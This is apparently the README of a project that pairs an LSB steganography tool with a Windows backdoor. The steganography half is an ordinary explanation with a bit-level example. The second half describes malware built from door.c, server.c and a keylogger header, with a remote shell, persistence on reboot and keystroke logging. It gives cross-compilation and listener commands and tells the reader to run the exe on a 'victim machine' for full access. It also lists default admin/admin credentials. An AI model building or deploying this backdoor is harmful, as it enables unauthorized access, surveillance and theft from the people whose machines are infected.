# Backxblackdoor

Login credintials
username -> admin
password -> admin

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We have two subparts included here
1. steganographic tool
2. backdoor

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This Project Describes the use of LSB Steganography.
Do check the python script written to implement lsb steganography

STEGANOGRAPHY comes from the Greek Words: STEGANOS – “Covered”, GRAPHIE – “Writing”. 
The sender hides his/her message within an image/audio/video.Since the algorithm uses the lease significant bit
to hide the secret message the change is undectable by a naked eye.
The various types of steganography include:

Image Steganography
Audio Steganography
Video Steganography
Text files Steganography

Types of Images:
Black and white
Geryscale
RGB

In a gray scale image each pixel is represented in 8 bits.
The last bit in a pixel is called as Least Significant bit as its value will affect the pixel value only by “1”.
So, this property is used to hide the data in the image.
If anyone have considered last two bits as LSB bits as they will affect the pixel value only by “3”

The LSB embedding approach has become the basis of many techniques that hide messages within multimedia carrier data.
LSB embedding may even be applied in particular data domains 
–for example, embedding a hidden message into the color values of RGB bitmap data

Let's study the application of LSB on a Greyscale Image
In a Greyscale image, each pixel is represented by 8 bits, while in a RGB it is 24 bits

Suppose the following are some of the bits in a Grayscale image

11110011
11011011
10110110
11011100
11011111
11010111
00100110
01000011

You wish to hide "A" in it. The ascii value of "A" is 10000001.
The algorithm simply replaces the last bit of the bytes with the consecutive bits of the letter "A", Giving us

11110011
11011010
10110110
11011100
11011110
11010110
00100110
01000011

Steganalysis
Steganalysis is the study of detecting messages hidden using steganography

It can be detected by looking at the histograms of the files

Also lossy compression technique can render LSB Steganography useless to an extent,
so lossless compression techniques should be used.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

How to compile and run Steganographic tool on linux:- 

#~ ./stego -f <filename.png> -e <message> -p <password>		-> to encrypt the message
#~ ./stego -f <filename.png> -x -p <password>				-> to decrypt the message

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Malware: Malware is intrusive software that is designed to damage and destroy computers and computer systems.
Malware is a contraction for “malicious software.”
Examples of common malware includes viruses, worms, Trojan viruses, spyware, adware, and ransomware.

Here we have 3 files
1. key logger.h
2. server.c
3. door.c

it is a header filre included in door.c to make the impr\ortant api keys

it is linux file which is used to connect to our main file that is door.c

it is our main malware file which creates a backdoor on the victims system (windows)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

in malware we did:-

//Create connection with our server (inside a main function)
//create a shell ffunction (wait for incoming command and iteerate over certain options
//automaticaly start program when machine is rebooted
//start/ spawn other programs
//navigation through different directories
//implementing keylogger to out backdoor

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

For malware compilation:- 

1. run the the command on kali linux terminal
		$~ sudo apt install mingw-w64
   to install the gcc compiler
2. after installing the c++/c compilor now we can convert the server.c file into working server. this is how its done
		$~ gcc server.c -o server
3. making the main server file, we now have to make our backdoor file into a runnable .exe file format. this is how its done
		$~ i686-w64(tab-button)-gcc -o door.exe door.c -lwsock32 -lwininet
4. now on the kali terminal run the command
		$~ ./server
   to start the server for capturing.
5. now transfer the .exe file to any windows system and run that file.
6. congratulate you have the whole access of that victim machine.

